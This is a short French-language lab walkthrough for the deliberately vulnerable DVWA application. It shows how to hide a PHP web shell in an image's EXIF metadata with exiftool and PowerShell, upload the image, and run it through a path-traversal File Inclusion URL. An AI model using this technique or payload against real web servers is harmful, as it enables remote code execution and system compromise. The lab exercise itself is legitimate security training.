# Exploitation de la Faille File Inclusion avec DVWA


# Mode difficulté : élevée (high)

## Objectif

Inclure du code malveillant dans une image.

## Mode opératoire

- Récupérez l'utilitaire exiftool ici : https://exiftool.org/
- Récupérez le code de la console web (shell.php) dans /template/remote-exec/shell.php
- Récupérez une image de petite taille, par exemple : https://image.pi7.org/static/img/pi750kbjpeg.png
- A l'aide de Powershell, exécutez le code suivant :

```powershell
$document = Get-Content "cheminverslefichierShell.php"
exiftool.exe -DocumentName="$document" "chemin_vers_image.jpg"
```

- Téléchargez l'image à l'aide de la page de chargement de DVWA (/DVWA/vulnerabilities/upload)
- Testez l'exécution de l'image à l'aide de la faille "File Inclusion" : DVWA/vulnerabilities/fi/?page=file1.php%0A/../../../hackable/uploads/votreimage.jpg
